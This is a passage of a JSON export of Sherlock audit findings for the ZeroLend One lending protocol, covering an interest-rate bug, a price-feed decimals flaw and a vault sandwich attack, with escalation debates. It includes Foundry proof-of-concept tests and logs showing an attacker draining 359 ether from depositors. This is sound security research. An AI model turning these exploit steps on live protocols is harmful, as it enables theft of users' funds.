issue during the judging contest.\n\n**Honour** commented:\n>  Possibly valid. However claims the rates are inflated which i believe is false and the opposite happens( deflated rates) this is because the pool balance will be higher at the time interest rates are calculated (hence lower utilization and lower rates)\n\n\n\n**nevillehuang**\n\nrequest poc\n\n**sherlock-admin4**\n\nPoC requested from @Tomiwasa0\n\nRequests remaining: **15**\n\n**Tomiwasa0**\n\n1. After setting Flashloan premium to 0.09%\n\n2. Import to the WithdrawtTEST\n\n```solidity\n++ import {IPool} from './../../../../contracts/interfaces/pool/IPool.sol';\n++ import {MockFlashLoanSimpleReceiver} from './../../../../contracts/mocks/MockSimpleFlashLoanReceiver.sol';\n\ncontract PoolWithdrawTests is PoolSetup {\n++   address alice = address(1);\n++  address bob = address(2);\n\n  \n++  event Transfer(address indexed from, address indexed to, uint256 value);\n```\n\n3. PASTE AND RUN THE POC\n```solidity\nfunction _generateFlashloanCondition() internal {\n    // Mint and approve tokenA and tokenC for bob\n    _mintAndApprove(bob, tokenA, 60 ether, address(pool));\n    _mintAndApprove(bob, tokenC, 2500 ether, address(pool));\n\n    // Start prank as bob to simulate transactions from bob's account\n    vm.startPrank(bob);\n\n    // Supply tokenC to the pool for bob\n    pool.supplySimple(address(tokenC), bob, 1000 ether, 0);\n\n    // Stop prank as bob\n    vm.stopPrank();\n}\n```\n\n### Updated `testPoolWithdraw` Function:\n```solidity\nfunction testPoolWithdraw() external {\n    // Declare amounts for supply, mint, withdraw, and borrow\n    uint256 supplyAmount = 60 ether;\n    uint256 mintAmount = 150 ether;\n    uint256 withdrawAmount = 10 ether;\n    uint256 index = 1;\n    uint256 borrowAmount = 20 ether;\n\n    // Mint and approve tokenA for owner\n    vm.startPrank(owner);\n    tokenA.mint(owner, mintAmount);\n    tokenA.approve(address(pool), supplyAmount);\n\n    // Supply tokenA to the pool for owner\n    pool.supplySimple(address(tokenA), owner, supplyAmount, index);\n\n    // Assert the balances after supplying tokenA\n    assertEq(tokenA.balanceOf(address(pool)), supplyAmount, 'Pool Balance Supply');\n    assertEq(tokenA.balanceOf(owner), mintAmount - supplyAmount, 'Owner Balance Supply');\n    assertEq(pool.getTotalSupplyRaw(address(tokenA)).supplyShares, supplyAmount);\n    assertEq(pool.getBalanceRaw(address(tokenA), owner, index).supplyShares, supplyAmount);\n\n    // Advance time by 100 seconds\n    uint256 currentTime1 = block.timestamp;\n    vm.warp(currentTime1 + 100);\n\n    // Borrow tokenA\n    pool.borrowSimple(address(tokenA), owner, borrowAmount, 1);\n    assertEq(tokenA.balanceOf(address(pool)), supplyAmount - borrowAmount);\n    assertEq(pool.getDebt(address(tokenA), owner, 1), borrowAmount);\n    assertEq(pool.totalDebt(address(tokenA)), borrowAmount);\n\n    vm.stopPrank();\n\n    // Advance time by 50 seconds\n    uint256 currentTime2 = block.timestamp;\n    vm.warp(currentTime2 + 50);\n\n    // Prepare and execute flash loan\n    bytes memory emptyParams;\n    MockFlashLoanSimpleReceiver mockFlashSimpleReceiver = new MockFlashLoanSimpleReceiver(pool);\n    _generateFlashloanCondition();\n\n    uint256 premium = poolFactory.flashLoanPremiumToProtocol();\n\n    vm.startPrank(alice);\n    tokenA.mint(alice, 10 ether);\n\n    // Expect flash loan event emission\n    vm.expectEmit(true, true, true, true);\n    emit PoolEventsLib.FlashLoan(address(mockFlashSimpleReceiver), alice, address(tokenA), 40 ether, (40 ether * premium) / 10_000);\n    emit Transfer(address(0), address(mockFlashSimpleReceiver), (40 ether * premium) / 10_000);\n\n    // Execute the flash loan\n    pool.flashLoanSimple(address(mockFlashSimpleReceiver), address(tokenA), 40 ether, emptyParams);\n    vm.stopPrank();\n\n    // Advance time by 200 seconds\n    uint256 currentTime = block.timestamp;\n    vm.warp(currentTime + 200);\n\n    // Assert the pool's balance after withdrawal\n    assertEq(tokenA.balanceOf(address(pool)), 40036000000000000000, 'Pool Balance Withdraw');\n\n    // Withdraw tokenA from the pool for the owner\n    vm.startPrank(owner);\n    pool.withdrawSimple(address(tokenA), owner, withdrawAmount, index);\n\n    // Advance time by 50 seconds\n    uint256 currentTime3 = block.timestamp;\n    vm.warp(currentTime3 + 50);\n\n    // Assert the remaining balance after withdrawal\n    assertEq(pool.getBalanceRaw(address(tokenA), owner, index).supplyShares, 50000001310612529086);\n\n    // Bob mints and supplies more tokenA\n    vm.startPrank(bob);\n    tokenA.mint(owner, mintAmount);\n    tokenA.approve(address(pool), supplyAmount);\n    pool.supplySimple(address(tokenA), bob, 60 ether, index);\n\n    // Assert the balance after Bob's supply\n    assertEq(pool.getBalanceRaw(address(tokenA), bob, index).supplyShares, 59999989872672182169);\n}\n```\nBefore Updating the index with Amount minted to tresury \nBob got - 59999989872672182169;\nAfter update -  59999989869411349179,\n\n```solidity\nFailing tests:\nEncountered 1 failing test in test/forge/core/pool/PoolWithdrawTests.t.sol:PoolWithdrawTests\n[FAIL. Reason: assertion failed: 59999989869411349179 != 59999989872672182169] testPoolWithdraw() (gas: 1531924)\n\nEncountered a total of 1 failing tests, 0 tests succeeded\n```\n\n4. I agree with the initial statement that the impact is a deflation, Apologies for the confusion i calculated this on paper initially and a tiny error was made. \n5. The attacker will mint more shares than they should and this can be weaponised to game the system for some profit by an attacker who just need to simply wait for a withdraw and then deposit lots of funds. \n6. Since DefaultReserveInterestRateStrategy uses IERC20(params.reserve).balanceOf(msg.sender). Attacker gains more amount than they should when the new rate is normalised.",
      "summary": "\nThis bug report discusses an issue with Zerolend's withdrawal mechanism, which leads to an incorrect interest rate being used for subsequent actions. This happens because the system fails to update the interest rate after transferring funds to the treasury during a withdrawal. This results in an inflated interest rate being used for actions like deposit, withdrawal, or borrow, leading to users receiving fewer shares than they should. The root cause of the issue is traced to the lack of interest rate updates in certain parts of the code. The impact of this bug is a deflation of shares, and it can be exploited by an attacker to gain more funds than they should. The suggested fix involves updating the interest rate before transferring funds to the treasury. A proof of concept has been requested, and the report concludes with a discussion on the impact and potential exploitation of this bug.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/387",
      "tags": [],
      "finders": [
        "A2-security",
        "iamnmt",
        "Obsidian",
        "Bigsam"
      ]
    },
    {
      "id": "41825",
      "title": "M-4: `GenericLogic.sol` contract assumes all price feeds has the same decimals but is a wrong assumption that leads to an incorrect health factor math.",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166 \n\n## Found by \n000000, A2-security, Honour, Obsidian, coffiasd, iamnmt, nfmelendez, silver\\_eth, stuart\\_the\\_minion\n### Summary\n\nMixing price feeds decimals when doing the calculation of  `totalCollateralInBaseCurrency` and `totalDebtInBaseCurrency` will cause an incorrect `healthFactor` affecting important operations of the protocol such as `liquidation`, `borrow` and `withdraw`. `GenericLogic.sol` contract assumes all price feeds have the same decimals but is a wrong assumption as is demonstrated in the Root cause section.\n\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/pool/logic/GenericLogic.sol#L106-L128\n\n### Root Cause\n\n`GenericLogic.sol:69 calculateUserAccountData` calculates the `totalCollateralInBaseCurrency` and the `totalDebtInBaseCurrency` doing a sum of all the differents reserve assets as collateral or debt in base currency but the problem is a wrong assumption that all chainlink price feeds has the same decimals. Most USD price feeds has 8 decimals but for example [AMPL / USD](https://etherscan.io/address/0xe20CA8D7546932360e37E9D72c1a47334af57706) feed has 18 decimals. So `totalCollateralInBaseCurrency` and the `totalDebtInBaseCurrency` will be incorrect because `calculateUserAccountData` will sum asset prices with different decimals leading to a wrong calculation of the health factor and incorrect function of many protocol operations. \n\n### Internal pre-conditions\n\n1. Price feeds for collateral or debt assets in a given position needs to have different decimals.\n\n\n### External pre-conditions\n\nNone\n\n### Attack Path\n\nIs a wrong assumption proven by example\n\n\n### Impact\n\n1. Liquidation: Mixing Price decimals lead to incorrect calculation of the `healthFactor` that is a result of wrong `totalCollateralInBaseCurrency` and the `totalDebtInBaseCurrency`.\n2. Borrow: Wrong `healthFactor` also affects borrowing when doing validations to make sure that the position is not liquiditable.\n3. Withdraw: Also uses `healthFactor` via `ValidationLofic::validateHFAndLtv`\n4. executeUseReserveAsCollateral: Also uses `healthFactor` via `ValidationLofic::validateHFAndLtv`\n5. Any other operation that uses the health factor.\n\n\n### PoC\n\nnone\n\n### Mitigation\n\nThere are 2 possible solution:\n\n1. Some protocols enforce 8 decimals when assigning an oracle to an asset or reject the operation. (easy, simple, secure, not flexible)\n2. Use AggregatorV3Interface::decimals to normalize to N decimals the price making sure that the precision loss is on the correct side. (flexible)\n\n\n\n\n## Discussion\n\n**nevillehuang**\n\nAs seen [here](https://github.com/sherlock-audit/2024-06-new-scope?tab=readme-ov-file#q-are-there-any-limitations-on-values-set-by-admins-or-other-roles-in-protocols-you-integrate-with-including-restrictions-on-array-lengths)\n\n> Q: Are there any limitations on values set by admins (or other roles) in protocols you integrate with, including restrictions on array lengths?\n> No\n\nThere is no limits to admin set chainlink oracles, so it is presumed that they will act accordingly when integrating tokens.\n\n> (External) Admin trust assumptions: When a function is access restricted, only values for specific function variables mentioned in the README can be taken into account when identifying an attack path.\n\n> If no values are provided, the (external) admin is trusted to use values that will not cause any issues.\n\n**Honour-d-dev**\n\nEscalate \n\nthis issue is valid!\n\nThe above [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166#issuecomment-2388428543) is not a valid reason for it to be invalid, pools are permissionless and anyone can create a pool and choose to integrate these tokens with un-conventional price feed decimals and the impact on users can be severe especially if not detected early.\n\nIf the argument is that the oracle can be removed or the token can be paused by admin if such an issue occurs, the impact is still severe (loss of funds for users , liquidation etc) and not reversible. Such cases can be easily prevented by the mitigation provided in the report.\n\n**sherlock-admin3**\n\n> Escalate \n> \n> this issue is valid!\n> \n> The above [comment](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166#issuecomment-2388428543) is not a valid reason for it to be invalid, pools are permissionless and anyone can create a pool and choose to integrate these tokens with un-conventional price feed decimals and the impact on users can be severe especially if not detected early.\n> \n> If the argument is that the oracle can be removed or the token can be paused by admin if such an issue occurs, the impact is still severe (loss of funds for users , liquidation etc) and not reversible. Such cases can be easily prevented by the mitigation provided in the report.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**cvetanovv**\n\nThe Lead Judge is right with his comment: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166#issuecomment-2388428543\n\nIn addition, pool managers are expected to act rationally(i.e. are trusted):\n\n> Essentially we expect all permissioned actors to behave rationally.\n>\n> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\nThe only valid variant of this issue is if there was mention of the malicious attack path. Then, I would duplicate it with #234.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**Honour-d-dev**\n\n@cvetanovv \n\nThe point here is pool creation is permissionless, so anyone can create a pool (become a pool manager) and add whichever tokens they like to their pool. The possibility of adding an oracle with wrong decimals cannot be attributed to irrational behavior(or being malicious) as there is no guarantee that the pool manager is aware of the fact that price feed decimals are not normalized (see second recommendations #166 and #442 ) in zerolend.\n\nThis can happen even if pool managers behave rationally (with good intentions) and can cause severe and irreversible damage to users before it's corrected. It's better to completely prevent the possibility of such cases as the chances of this happening is pretty high given the permissionless nature of pools.\n\n**cvetanovv**\n\n@Honour-d-dev \n\nIf the pool manager did everything right, then there is no issue here. By default, he is the external admin and, by default, should do everything correctly. If not, it is a user mistake. \n\n@nevillehuang explained it in the first comment. \n\nMy decision to reject the escalation remains.\n\n**Honour-d-dev**\n\n@cvetanovv i appreciate the effort 🙏\n\nConsider this. Alice creates a pool and decides to add the AML token to her pool and she also adds the chainlink AML/USD oracle to this pool.\n\nFrom every perspective Alice has done everything right.\nThis cannot be grouped as user mistakes because user mistakes only hurt themselves, hence why they are invalid.\n\nIn this case Alice is a pool manager and this issue will affect all users of their pool not just Alice.\n\nAs I mentioned in previous comments I believe the chances of this happening is very high.\nAnd it would be unfair to pool users to call it a user mistake. \n\n**samuraii77**\n\n@cvetanovv. how would a pool manager do everything right though? If he wants to create a pool for an asset that has a different amount of decimals in Chainlink, then this will always lead to an error. His only way of avoiding this is not creating a pool with such an asset which I don't believe is a fair reason to classify this as invalid.\n\n**cvetanovv**\n\n@Honour-d-dev @samuraii77 I understand your points.\n\nThe protocol will use standard tokens, but some standard tokens may return a different price due to the lack of decimal scaling. \nThis means that the pool manager will not be able to use them, although it is mentioned in the readme that they can be used. \n\nThis means no working functionality because they will not be used because the pool manager has to act rationally, and using them will cause a bug - Medium severity. \n\nReference: https://ethereum.stackexchange.com/questions/92508/do-all-chainlink-feeds-return-prices-with-8-decimals-of-precision, https://ethereum.stackexchange.com/questions/90552/does-chainlink-decimal-change-over-time\n\nI am planning to accept the escalation and make this issue Medium severity.\n\n**WangSecurity**\n\nResult:\nMedium\nHas duplicates \n\n**sherlock-admin4**\n\nEscalations have been resolved successfully!\n\nEscalation status:\n- [Honour-d-dev](https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166/#issuecomment-2395201631): accepted\n\n**coffiasd**\n\n@cvetanovv those issues that dups with this issue are also valid or not ? \n\n**cvetanovv**\n\n@coffiasd, the duplicates are also valid. Labels are added at the end after the escalations are over.",
      "summary": "\nThe `GenericLogic.sol` contract in the ZeroLend protocol assumes that all price feeds have the same number of decimals, but this is not always the case. This can lead to incorrect calculations of the health factor, which affects important operations such as liquidation, borrowing, and withdrawing. The root cause is a wrong assumption that all price feeds have the same decimals, but some tokens have a different number of decimals. This can cause severe damage to users and cannot be attributed to user mistakes. The issue has been escalated and accepted as a medium severity issue.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "Sherlock",
      "protocol_name": "ZeroLend One",
      "source_link": "",
      "github_link": "https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/166",
      "tags": [],
      "finders": [
        "stuart\\_the\\_minion",
        "000000",
        "Honour",
        "silver\\_eth",
        "Obsidian",
        "coffiasd",
        "A2-security",
        "nfmelendez",
        "iamnmt"
      ]
    },
    {
      "id": "41824",
      "title": "M-3: Malicious actors can execute sandwich attacks during market addition with existing funds",
      "impact": "MEDIUM",
      "content": "Source: https://github.com/sherlock-audit/2024-06-new-scope-judging/issues/143 \n\n## Found by \n0xNirix\n### Summary\n\nThe immediate addition of assets from a new and re-added market with existing assets in vault's position will cause a significant financial loss for existing vault users as attackers will execute a sandwich attack to profit from the asset-share ratio changes.\n\n### Root Cause\n\nThe vulnerability stems from the immediate update of total assets when adding or re-adding a market with existing assets in the vault's position. This occurs in the _setCap method called by acceptCap:\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVaultSetters.sol#L85-L105\n\n```solidity\n        withdrawQueue.push(pool);\n\n        if (withdrawQueue.length > MAX_QUEUE_LENGTH) revert CuratedErrorsLib.MaxQueueLengthExceeded();\n\n        marketConfig.enabled = true;\n\n        // Take into account assets of the new market without applying a fee.\n        pool.forceUpdateReserve(asset());\n        uint256 supplyAssets = pool.supplyAssets(asset(), positionId);\n        _updateLastTotalAssets(lastTotalAssets + supplyAssets);\n```\n\nThis immediate update to assets is also reflected in the totalAssets() function, which sums the balance of all markets in the withdraw queue\nhttps://github.com/sherlock-audit/2024-06-new-scope/blob/main/zerolend-one/contracts/core/vaults/CuratedVault.sol#L368\n```solidity\n  function totalAssets() public view override returns (uint256 assets) {\n    for (uint256 i; i < withdrawQueue.length; ++i) {\n      assets += withdrawQueue[i].getBalanceByPosition(asset(), positionId);\n    }\n  }\n```\n\nThe totalAssets() value is then used in share-to-asset conversions:\n```solidity\n function _accruedFeeShares() internal view returns (uint256 feeShares, uint256 newTotalAssets) {\n    newTotalAssets = totalAssets();\n```\n```solidity\n    assets = _convertToAssetsWithTotals(shares, totalSupply(), newTotalAssets, MathUpgradeable.Rounding.Up);\n```\n\nThis mechanism allows an attacker to observe the acceptCap transaction and execute a sandwich attack:\n\nDeposit assets to receive X shares for Y assets before the market addition.\nAfter the market addition increases total assets, withdraw the same X shares to receive Y + Δ assets, where Δ is determined by the new asset-to-share ratio.\n\n### Internal pre-conditions\n\n1. Admin needs to call acceptCap() to add a market\n2. The new/ re-added market needs to have a non-zero supplyAssets value in vault's position\n\n### External pre-conditions\n\n_No response_\n\n### Attack Path\n\n1. Attacker calls deposit() just before a market with existing position for the vault is added\n2. Admin calls acceptCap() to add the market with existing funds for the vault\n3. Assets of the vault are immediately increased by the amount of assets in the position for the added market, as the market is added to the withdraw queue and total assets take into account assets from all markets present in the withdraw queue\n4. Attacker calls withdraw() to remove their recently deposited funds\n5. Attacker receives more assets than initially deposited due to the increased asset to share ratio.\n\n### Impact\n\nThe existing vault users suffer a loss proportional to the size of the new/ re-added market's assets relative to the total vault assets before the addition. The attacker gains this difference at the expense of other users.\n\n\n**Isn't it impossible to add a market with existing funds?**\nA: No, it's actually possible and even anticipated in two scenarios:\nReintegrating a previously removed market with leftover funds, e.g. A market removed due to an issue, but not all funds were withdrawn.\nAdding a new market that received donations to the vaults position directly via the pool contract.\n\nThe contract specifically accounts for these cases by not charging fees on these pre-existing funds, as shown by the comment in the code `// Take into account assets of the new market without applying a fee.`\n\n**Why is this vulnerability critical?**\nA: It's critical because:\n\n- It directly risks funds belonging to existing users which were lost when a market had to be removed with leftover funds.\n- Even donations loss can be considered as a loss for existing users.\n\n\n### PoC\n\n_No response_\n\n### Mitigation\n\nIn case of adding a market with existing funds, consider gradual unlocking of assets over a period of time.\n\n\n\n## Discussion\n\n**nevillehuang**\n\nrequest poc\n\n**sherlock-admin4**\n\nPoC requested from @0xNirix\n\nRequests remaining: **13**\n\n**0xNirix**\n\nThanks.\nHere is the POC code and result\n\n```solidity\npragma solidity ^0.8.0;\n\nimport './helpers/BaseVaultTest.sol';\nimport {CuratedErrorsLib, CuratedEventsLib, CuratedVault, PendingUint192} from '../../../../contracts/core/vaults/CuratedVault.sol';\nimport {CuratedVaultFactory, ICuratedVaultFactory} from '../../../../contracts/core/vaults/CuratedVaultFactory.sol';\n\nuint256 constant TIMELOCK = 1 weeks;\n\ncontract CuratedVaultSandwichTest is BaseVaultTest {\n    using MathLib for uint256;\n\n    ICuratedVault internal vault;\n    ICuratedVaultFactory internal vaultFactory;\n    ICuratedVaultFactory.InitVaultParams internal defaultVaultParams;\n\n    address attacker;\n    address user;\n\n    function setUp() public {\n        _setUpBaseVault();\n        _setUpVault();\n\n        attacker = makeAddr(\"attacker\");\n        user = makeAddr(\"user\");\n\n        // Setup initial cap for all\n        _setCap(allMarkets[0], 600 ether);\n        _setCap(allMarkets[1], 600 ether);\n        _setCap(allMarkets[2], 600 ether);\n\n        // Set supply queue to use both markets\n        IPool[] memory newSupplyQueue = new IPool[](2);\n        newSupplyQueue[0] = allMarkets[0];\n        newSupplyQueue[1] = allMarkets[1];\n        vm.prank(allocator);\n        vault.setSupplyQueue(newSupplyQueue);\n\n        // Mint tokens to users\n        deal(address(loanToken), user, 1000 ether);\n        deal(address(loanToken), attacker, 1000 ether);\n\n        // Approve vault to spend user's tokens\n        vm.prank(user);\n        loanToken.approve(address(vault), 1000 ether);\n        vm.prank(attacker);\n        loanToken.approve(address(vault), 1000 ether);\n    }\n\n    function _setUpVault() internal {\n        // copied from Integration Vault Test\n        CuratedVault instance = new CuratedVault();\n        vaultFactory = ICuratedVaultFactory(new CuratedVaultFactory(address(instance)));\n\n        // setup the default vault params\n        address[] memory admins = new address[](1);\n        address[] memory curators = new address[](1);\n        address[] memory guardians = new address[](1);\n        address[] memory allocators = new address[](1);\n        admins[0] = owner;\n        curators[0] = curator;\n        guardians[0] = guardian;\n        allocators[0] = allocator;\n        defaultVaultParams = ICuratedVaultFactory.InitVaultParams({\n            revokeProxy: true,\n            proxyAdmin: owner,\n            admins: admins,\n            curators: curators,\n            guardians: guardians,\n            allocators: allocators,\n            timelock: 1 weeks,\n            asset: address(loanToken),\n            name: 'Vault',\n            symbol: 'VLT',\n            salt: keccak256('salty')\n        });\n\n        vault = vaultFactory.createVault(defaultVaultParams);\n\n        vm.startPrank(owner);\n        vault.grantCuratorRole(curator);\n        vault.grantAllocatorRole(allocator);\n        vault.setFeeRecipient(feeRecipient);\n        vault.setSkimRecipient(skimRecipient);\n        vm.stopPrank();\n\n        _setCap(idleMarket, type(uint184).max);\n\n        loanToken.approve(address(vault), type(uint256).max);\n        collateralToken.approve(address(vault), type(uint256).max);\n\n        vm.startPrank(supplier);\n        loanToken.approve(address(vault), type(uint256).max);\n        collateralToken.approve(address(vault), type(uint256).max);\n        vm.stopPrank();\n\n        vm.startPrank(onBehalf);\n        loanToken.approve(address(vault), type(uint256).max);\n        collateralToken.approve(address(vault), type(uint256).max);\n        vm.stopPrank();\n    }\n\n\n    function _setCap(IPool pool, uint256 newCap) internal {\n        // largely copied from IntegrationVaultTest.sol\n\n        uint256 cap = vault.config(pool).cap;\n        bool isEnabled = vault.config(pool).enabled;\n\n        \n        if (newCap == cap) {\n            console.log(\"New cap is the same as current cap, returning\");\n            return;\n        }\n\n        PendingUint192 memory pendingCap = vault.pendingCap(pool);\n       \n        if (pendingCap.validAt == 0 || newCap != pendingCap.value || true) {\n            vm.prank(curator);\n            vault.submitCap(pool, newCap);\n        }\n\n        vm.warp(block.timestamp + vault.timelock());\n\n        if (newCap > 0) {\n            vault.acceptCap(pool);\n            if (!isEnabled) {\n                IPool[] memory newSupplyQueue = new IPool[](vault.supplyQueueLength() + 1);\n                for (uint256 k; k < vault.supplyQueueLength(); k++) {\n                    newSupplyQueue[k] = vault.supplyQueue(k);\n                }\n                newSupplyQueue[vault.supplyQueueLength()] = pool;\n                vm.prank(allocator);\n                vault.setSupplyQueue(newSupplyQueue);\n            }\n        }\n    }\n\n    function testSandwichAttackOnMarketReaddition() public {\n       \n        // Initial deposit by a user\n        vm.prank(user);\n        vault.deposit(800 ether, user);\n\n         // Log state \n        console.log(\"Total initial assets:\", vault.totalAssets()/ 1 ether, \"ether\");\n        console.log(\"User shares:\", vault.balanceOf(user) / 1 ether, \"ether\");\n        console.log(\"User assets:\", vault.convertToAssets(vault.balanceOf(user))/ 1 ether, \"ether\");\n\n        // First market had to be removed due to issues.\n        _setCap(allMarkets[0], 0);\n        vm.startPrank(curator);\n        vault.submitMarketRemoval(allMarkets[0]);\n        vm.stopPrank();\n\n        vm.warp(block.timestamp + vault.timelock() + 1);\n\n        vm.startPrank(allocator);\n        uint256[] memory withdrawQueue = new uint256[](3);\n        // the index of first market is 1 in withdrawal queue as setup in basevaulttest\n        withdrawQueue[0] = 0;\n        withdrawQueue[1] = 2;\n        withdrawQueue[2] = 3;\n        vault.updateWithdrawQueue(withdrawQueue);\n        vm.stopPrank();\n\n        // Attacker deposits just before market is re-added\n        vm.prank(attacker);\n        uint256 attackerShares = vault.deposit(300 ether, attacker);\n\n        console.log(\"Attacker initial deposit: 300 ether\");\n        console.log(\"Attacker shares received: \", attackerShares/ 1 ether, \"ether\");\n\n        // Re-add the removed market back which had assets\n        _setCap(allMarkets[0], 600 ether);\n\n        // Attacker withdraws\n        vm.prank(attacker);\n        uint256 withdrawnAssets = vault.redeem(attackerShares, attacker, attacker);\n\n        console.log(\"Attacker assets withdrawn after market readdition: \", withdrawnAssets/ 1 ether, \"ether\");\n        console.log(\"Attacker profit: \", (withdrawnAssets - 300 ether) / 1 ether, \"ether\");\n\n        // Check the impact on the user\n        uint256 userShares= vault.balanceOf(user);\n        uint256 userAssetsAfter = vault.convertToAssets(userShares);\n\n        console.log(\"After attack, User assets: \", userAssetsAfter/ 1 ether, \"ether\");\n        console.log(\"After attack, User loss: \", (800 ether - userAssetsAfter)/ 1 ether, \"ether\");\n\n        // Log final state\n        console.log(\"Total assets after attack:\", vault.totalAssets()/ 1 ether, \"ether\");\n    }\n}\n```\n\n\nLog output\n\nLogs:\n  Total initial assets: 800 ether\n  User shares: 800 ether\n  User assets: 800 ether\n  Attacker initial deposit: 300 ether\n  Attacker shares received:  1199 ether\n  Attacker assets withdrawn after market readdition:  659 ether\n  Attacker profit:  359 ether\n  After attack, User assets:  440 ether\n  After attack, User loss:  359 ether\n  Total assets after attack: 440 ether\n\n\n\nExplanation:\n\n1. Initial State:\n   - A user deposits 800 ether into the vault.\n   - Total assets and user's shares are both 800 ether, indicating a 1:1 ratio of assets to shares.\n   - A market with supplied assets had to be removed causing socialized loss for all users.\n\n2. Attack Preparation:\n   - Just before the market with existing funds is re-added, the attacker deposits 300 ether.\n   - The attacker receives 1199 shares, which is more than their deposit due to the current asset-to-share ratio.\n\n3. Market Re-addition:\n   - The previously removed market with existing funds is re-added to the vault after resolution of issue.\n   - This immediately increases the total assets of the vault without minting new shares.\n\n4. Attacker's Withdrawal:\n   - The attacker quickly withdraws their 1199 shares.\n   - Due to the increased total assets, these shares are now worth 659 ether.\n   - The attacker profits 359 ether (659 - 300).\n\n5. Impact on the Original User:\n   - The user's 800 shares, which originally represented 800 ether, now only represent 440 ether even though no actual fund is lost as market has recovered.\n   - The user has effectively lost 359 ether, which is exactly the amount the attacker gained.\n\n\n\n**Honour-d-dev**\n\nEscalate\n\nThe report claims this issue is valid due to the following reasons \n\n>**Isn't it impossible to add a market with existing funds?**\nA: No, it's actually possible and even anticipated in two scenarios:\nReintegrating a previously removed market with leftover funds, e.g. A market removed due to an issue, but not all funds were withdrawn.\nAdding a new market that received donations to the vaults position directly via the pool contract.\n>\n>The contract specifically accounts for these cases by not charging fees on these pre-existing funds, as shown by the comment in the code // Take into account assets of the new market without applying a fee.\n>\n>**Why is this vulnerability critical?**\nA: It's critical because:\n>\n>It directly risks funds belonging to existing users which were lost when a market had to be removed with leftover funds.\nEven donations loss can be considered as a loss for existing users.\n\nI believe this report is invalid for the following reasons\n\n**on adding/removing markets with existing funds**\n\n- There is a `reallocate()` function for this exact purpose to transfer all funds from a pool before removal, because removing a pool with existing funds will lead to a loss for the depositors.\n- The removal and addition of markets are admin functionalities and we can assume that the admin will follow the right process to prevent losses to users.\n\n**on donations**\n- Market donations fall under the **user mistakes** category, as donated funds are lost any ways. Donations can happen regardless of whether a new market is being added or not and a watcher can take advantage of the  increase in totalAssets to extract some value , this does not affect existing users negatively as they also benefit from said donations.\n\n**sherlock-admin3**\n\n> Escalate\n> \n> The report claims this issue is valid due to the following reasons \n> \n> >**Isn't it impossible to add a market with existing funds?**\n> A: No, it's actually possible and even anticipated in two scenarios:\n> Reintegrating a previously removed market with leftover funds, e.g. A market removed due to an issue, but not all funds were withdrawn.\n> Adding a new market that received donations to the vaults position directly via the pool contract.\n> >\n> >The contract specifically accounts for these cases by not charging fees on these pre-existing funds, as shown by the comment in the code // Take into account assets of the new market without applying a fee.\n> >\n> >**Why is this vulnerability critical?**\n> A: It's critical because:\n> >\n> >It directly risks funds belonging to existing users which were lost when a market had to be removed with leftover funds.\n> Even donations loss can be considered as a loss for existing users.\n> \n> I believe this report is invalid for the following reasons\n> \n> **on adding/removing markets with existing funds**\n> \n> - There is a `reallocate()` function for this exact purpose to transfer all funds from a pool before removal, because removing a pool with existing funds will lead to a loss for the depositors.\n> - The removal and addition of markets are admin functionalities and we can assume that the admin will follow the right process to prevent losses to users.\n> \n> **on donations**\n> - Market donations fall under the **user mistakes** category, as donated funds are lost any ways. Donations can happen regardless of whether a new market is being added or not and a watcher can take advantage of the  increase in totalAssets to extract some value , this does not affect existing users negatively as they also benefit from said donations.\n\nYou've created a valid escalation!\n\nTo remove the escalation from consideration: Delete your comment.\n\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n\n**0xNirix**\n\nAbsolutely, vault allocator will try to withdraw from pools via reallocate before removing a pool. However, it is not possible in all scenarios. There might be a number of reasons for withdrawals to not happen or to be incomplete e.g. complete withdrawal amount not available in pool or any configuration changes by pool managers e.g. freezing the reserves. Pool managers cannot be trusted by vault managers according to README.\n> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\nThe code specifically tries to handle such scenarios further indicating they are completely intentional:\n\n1. The contract includes mechanisms to remove pools with remaining assets. This is evident in the updateWithdrawQueue function:\n```solidity\n        if (pool.supplyShares(asset(), positionId) != 0) {\n          if (config[pool].removableAt == 0) revert CuratedErrorsLib.InvalidMarketRemovalNonZeroSupply(pool);\n          if (block.timestamp < config[pool].removableAt) {\n            revert CuratedErrorsLib.InvalidMarketRemovalTimelockNotElapsed(pool);\n          }\n        }\n```\nIn this code, after timelock expiry (removableAt) pool with assets will be removed.\n\n2. Furthermore, the contract anticipates potential resolution of pool issues, allowing for the reintegration of previously removed assets. If a pool's problems are resolved in the future, the vault allocator would naturally want to reclaim those assets for the benefit of their vault users. This is why the following code exists to add back the pool's assets to the vault's total assets:\n\n```solidity\n        pool.forceUpdateReserve(asset());\n        uint256 supplyAssets = pool.supplyAssets(asset(), positionId);\n        _updateLastTotalAssets(lastTotalAssets + supplyAssets);\n```\n\nHowever, this creates a vulnerability: An attacker can exploit this process to steal a majority of these funds, as demonstrated in the provided Proof of Concept (POC).\n\n**cvetanovv**\n\nI believe the main factor that validates this issue is the lack of trust between vault managers and pool managers:\n\n> There are two set of actors. Actors who manage pools and actors who mange vaults. If an action done by one party causes the other party to suffer losses we'd want to consider that.\n\nWhen a pool with remaining assets is removed and later reintegrated, its assets can be exploited and stolen through this vulnerability. The key point is that vault and pool actors do not trust each other, which leaves room for such vulnerabilities.\n\nPlanning to reject the escalation and leave the issue as is.\n\n**0xjuaan**\n\nHi @cvetanovv this is an invalid 